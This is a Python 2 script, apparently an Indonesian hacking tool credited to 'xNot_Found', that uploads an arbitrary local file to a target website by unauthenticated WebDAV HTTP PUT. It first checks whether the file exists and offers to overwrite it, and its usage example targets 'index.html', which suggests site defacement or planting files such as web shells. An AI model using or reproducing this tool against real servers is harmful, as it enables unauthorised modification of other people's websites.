#!/usr/bin/python
#JanganDiotak-atikLagi
#Email : febryafriansyah@myself.com
#Wa : +12342172669
import requests
import string
import random
import sys
import os

os.system("clear")

def webdav():
  sc = ''
  with open(sys.argv[2], 'rb') as f:
      depes = f.read()
  script = depes
  host = sys.argv[1]
  if not host.startswith('http'):
    host = 'http://' + host
  nama = '/'+sys.argv[2]


  print(" %s Akan Segera Diupload :v") % (sys.argv[2])
  print("Uploading %d bytes") % len(script)

  r = requests.request('put', host + nama, data=script, headers={'Content-Type':'application/octet-stream'})

  if r.status_code < 200 or r.status_code >= 300:
    print("\033[1;31;1mOps Gagal Upload.")
    sys.exit(1)
  else:
    print("\033[1;32mFile Berhasil Di upload")
    print("PATH : "+host + nama)
    print("Jangan Lupa di SC nya cantumin nama gw :v")


def cekfile():
 print("""
===>> Coded By xNot_Found <<===
""")
 print("Sedang Cek File Di WebTarget : "+sys.argv[1]+"/"+sys.argv[2])
 r = requests.get(sys.argv[1] +"/"+ sys.argv[2])
 if r.status_code == requests.codes.ok:
  print("Sudah Ada File Yang Sama Di Web Target")
  tanya = raw_input("Timpa Filenya? [Y/N] > ")
  if tanya == "Y":
   webdav()
  else:
   print("Exiting Tools . . .")
   sys.exit()
 else:
   print("Please Wait")
   webdav()


if __name__ == '__main__':
  if len(sys.argv) != 3:
    print("\033[1;32mSelamat Datang Di Tools Yang Sederhana Ini :)")
    print("\033[1;31;1mCoded By xNot_Found")
    print("\033[1;32mTools Ini Menggunakan python2")
    print("\033[1;31;1m\n USAGE :python2 "+sys.argv[0]+" webtarget.com index.html\n")
    sys.exit(0)
  else:
    cekfile()